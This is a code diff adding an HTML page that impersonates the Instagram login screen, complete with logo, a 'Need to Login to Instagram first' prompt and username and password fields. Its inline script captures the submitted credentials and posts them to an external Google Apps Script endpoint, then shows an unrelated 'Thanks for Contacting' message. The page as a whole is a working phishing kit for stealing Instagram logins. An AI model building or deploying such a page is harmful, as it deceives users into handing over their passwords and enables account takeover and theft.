@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        
+        <div class="img">
+           
+
+        </div>
+        <div class="login">
+            <p class="popup">Need to Login to Instagram first !</p>
+            <form action="" method="post" class="ui" name="login-details">
+                <div class="instagram-logo">
+                    <img src="logo.png" alt="" srcset="">
+                </div>
+                <input type="text" name="Name" id="" placeholder="Phone number, username, or email">
+                <input type="password" name="Password" id="" placeholder="Password">
+                <span>
+                    <input type="checkbox" name="Checkbox" id="">
+                    <label for="">Remember me</label>
+                </span>
+                <button type="submit">Sign in</button>
+                <p class="message">Don't have an account? <span><a href="#">Sign Up</a></span></p>
+            </form>
+        </div>
+    </div>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxJsowIVf4bFHTP4p-a2H1RCgoVPgjoVijcup8SiVf6I9moDmevVyiUsDc7-nFT48dfVw/exec'
+            const form = document.forms['login-details']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting ume..! I Will Contact You Soon..."))
+                .catch(error => console.error('Error!', error.message))
+            })
+    </script>
+</body>
+</html>
